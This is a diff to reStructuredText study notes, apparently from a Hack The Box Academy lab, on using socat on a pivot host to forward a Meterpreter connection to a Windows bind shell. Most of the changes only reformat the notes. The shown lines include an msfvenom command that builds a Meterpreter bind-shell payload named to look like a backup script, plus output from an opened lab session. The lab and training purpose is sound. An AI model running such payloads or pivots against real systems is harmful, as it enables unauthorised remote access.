@@ -1,5 +1,5 @@
 Socat Redirection with a Bind Shell
-###################################
+#####################################
 
 Date: 2024-11-02 14:33
 
@@ -7,17 +7,13 @@ Status:
 
 Tags: 
 
-
-Description
-***********
-
 The Windows server starts a listener and binds to a port.  The socat listener on the pivot host in this example listens for requests
 from the Meterpreter on the attack host and forwards that to the Windows bind shell.
 
 
 Step 1:  Create the Windows payload
 
-.. code-block::
+.. code-block:: console
 
     msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443
 
@@ -52,12 +48,11 @@ Use the shell created in Meterpreter
 .. code-block:: console
 
     [*] Sending stage (200262 bytes) to 10.129.202.64
-[*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500
+    [*] Meterpreter session 1 opened (10.10.14.18:46253 -> 10.129.202.64:8080 ) at 2022-03-07 12:44:44 -0500
 
 meterpreter > getuid
 Server username: INLANEFREIGHT\victor
 
 
-References 
-***********
+
 https://academy.hackthebox.com/module/158/section/1429
